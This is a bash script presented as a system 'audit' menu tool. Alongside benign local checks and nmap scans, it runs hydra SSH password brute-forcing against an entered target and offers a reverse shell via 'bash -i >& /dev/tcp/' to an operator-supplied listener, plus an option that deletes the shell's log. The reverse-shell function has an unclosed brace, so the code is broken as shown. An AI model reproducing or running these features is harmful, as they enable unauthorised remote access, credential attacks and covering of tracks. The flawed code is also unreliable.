#!/bin/bash

##################################
# SysAudit Version 0.2 (BETA)    #
##################################
# Developed with ❤️ on GitHub    #
# By SirCryptic                   #
##################################
# Special Thanks to:              #
# NullSecurityTeam                #
# M0bly {👀}                     #
# Double A {MIA}                  #
# R1ff                            #
# M0nde                           #
# lucci                           #
# Jack {R.I.P}                    #
# Kiera                           #
##################################
# Disclaimer:                     #
# This script is in BETA. It has  #
# been developed using basic      #
# knowledge and may contain bugs. #
# Use at your own risk.           #
##################################

# Global Variables
SCAN_DIR="audit_results_$(date +%F_%T)"
mkdir -p "$SCAN_DIR"

# Centralized Command Checker
check_command() {
    if ! command -v "$1" &> /dev/null; then
        echo "Error: $1 is not installed." >&2
        return 1
    fi
}

# Function Definitions

perform_network_scan() {
    read -p "Enter target IP or range (e.g., 192.168.1.0/24): " target
    if [[ -z "$target" ]]; then
        echo "Error: No target provided." >&2
        return 1
    fi

    check_command nmap || return 1

    echo "Performing Network Scan on $target..."
    nmap -sP "$target" -oN "$SCAN_DIR/network_scan.txt" &

    echo "Network Scan initiated, running in background..."
}

perform_vulnerability_assessment() {
    read -p "Enter target IP or domain: " target
    if [[ -z "$target" ]]; then
        echo "Error: No target provided." >&2
        return 1
    fi

    check_command nmap || return 1

    echo "Performing Vulnerability Assessment on $target..."
    nmap --script vuln "$target" -oN "$SCAN_DIR/vuln_assessment.txt"
    echo "Vulnerability Assessment Complete."
}

run_compliance_check() {
    read -p "Enter target IP or range (e.g., 192.168.1.0/24): " target
    if [[ -z "$target" ]]; then
        echo "Error: No target provided." >&2
        return 1
    fi

    check_command nmap || return 1
    check_command hydra || return 1

    echo "Running Compliance Check on $target..."
    nmap -p 22 --open -sV "$target" -oN "$SCAN_DIR/ssh_compliance.txt"
    hydra -L usernames.txt -P passwords.txt ssh://"$target" -o "$SCAN_DIR/weak_passwords.txt"
    echo "Compliance Check Complete."
}

collect_system_info() {
    echo "Gathering System Information..."
    {
        echo "Hostname: $(hostname)"
        echo "Operating System: $(uname -o)"
        echo "Kernel Version: $(uname -r)"
        echo "Uptime: $(uptime -p)"
        echo "Users Currently Logged In: $(who)"
        echo "Free Memory: $(free -h | grep Mem | awk '{print $4}')"
        echo "Disk Usage: $(df -h | grep '/$' | awk '{print $5}')"
        echo "Current User: $(whoami)"
        echo "Active Processes: $(ps -eo cmd | wc -l)"
    } > "$SCAN_DIR/system_info.txt"
    echo "System Information Collected."
}

check_password_policy() {
    echo "Checking Password Policy..."
    {
        if [[ -f /etc/login.defs ]]; then
            grep -E 'PASS_MAX_DAYS|PASS_MIN_DAYS|PASS_WARN_AGE' /etc/login.defs || echo "Password policy file not accessible."
        else
            echo "Password policy file does not exist."
        fi
    } > "$SCAN_DIR/password_policy.txt"
    echo "Password Policy Check Complete."
}

check_firewall_status() {
    check_command ufw || return 1

    echo "Checking Firewall Status..."
    ufw status verbose > "$SCAN_DIR/firewall_status.txt"
    echo "Firewall Status Check Complete."
}

generate_audit_report() {
    local report_file="$SCAN_DIR/audit_report.txt"
    
    echo "Generating Report..."
    {
        cat "$SCAN_DIR"/*.txt
    } > "$report_file"

    echo "Report Generated: $report_file"
}

cleanup_old_files() {
    echo "Cleaning up old result files..."
    find . -type d -name "audit_results_*" -mtime +7 -exec rm -r {} +
    echo "Old files cleaned."
}

start_reverse_shell() {
    read -p "Enter listener IP: " listener_ip
    read -p "Enter listener port: " listener_port
    local log_file="$SCAN_DIR/reverse_shell.log"

    echo "Starting reverse shell to $listener_ip on port $listener_port..."
    
    {
        # Start the reverse shell and log input and output
        { 
            bash -i >& /dev/tcp/"$listener_ip"/"$listener_port" 0>&1
        } | tee "$log_file" | {
            # Log the received data and send it back
            while IFS= read -r line; do
                echo "Received: $line"
                echo "$line" >&3
            done
        } 3>&1 &

    echo "Reverse shell initiated. Logging to $log_file."
}

cleanup_reverse_shell() {
    echo "Cleaning up reverse shell log..."
    rm -f "$SCAN_DIR/reverse_shell.log"
    echo "Reverse shell log cleaned."
}

# Main Menu
while true; do
    echo "Select an audit option:"
    echo "1. Network Scan"
    echo "2. Vulnerability Assessment"
    echo "3. Compliance Check"
    echo "4. System Information"
    echo "5. Password Policy Check"
    echo "6. Firewall Status"
    echo "7. Generate Report"
    echo "8. Cleanup Old Files"
    echo "9. Start Reverse Shell"
    echo "10. Cleanup Reverse Shell Log"
    echo "11. Exit"

    read -p "Enter choice [1-11]: " choice

    case $choice in
        1) perform_network_scan ;;
        2) perform_vulnerability_assessment ;;
        3) run_compliance_check ;;
        4) collect_system_info ;;
        5) check_password_policy ;;
        6) check_firewall_status ;;
        7) generate_audit_report ;;
        8) cleanup_old_files ;;
        9) start_reverse_shell ;;
        10) cleanup_reverse_shell ;;
        11) echo "Exiting..." ; exit 0 ;;
        *) echo "Invalid choice, please try again." ;;
    esac
done
